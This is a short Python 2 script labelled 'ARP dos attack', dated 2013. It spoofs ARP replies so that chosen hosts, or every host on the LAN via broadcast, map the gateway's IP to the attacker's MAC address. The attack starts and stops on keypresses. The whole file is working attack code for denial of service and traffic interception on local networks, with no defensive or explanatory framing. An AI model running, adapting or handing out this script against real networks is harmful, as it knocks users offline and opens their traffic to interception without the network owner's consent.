#!/usr/bin/python
# -*- coding: utf-8 -*-
#
# ARP dos attack
# copyright ¢ 2013 by Domen Ipavec

from ethernet.arpspoof import ARPSpoof
from netaddr import EUI, IPAddress
from printformat import fancy_list

import sys

if len(sys.argv) == 1:
	print "Usage: command network-interface [target(s)]"
else:
	arpspoof = ARPSpoof(sys.argv[1])

	targets = []
	if len(sys.argv) >= 3:
		for target in sys.argv[2:]:
			# first try target as MAC, otherwise try IPAddress
			try:
				targets.append(EUI(target))
			except:
				targets.append(arpspoof.original_data[IPAddress(target)])
	else:
		targets.append(arpspoof.mac_addresses['broadcast'])
	
	# spoof gateway mac of all targets to this computer
	for target in targets:
		arpspoof.addSpoof(target, arpspoof.ip_addresses['gateway'], arpspoof.mac_addresses['addr'])

	raw_input("Press enter to start attack on '%s'." % fancy_list(targets))
	arpspoof.start()

	raw_input("Press enter to stop the attack.")
	arpspoof.stop()
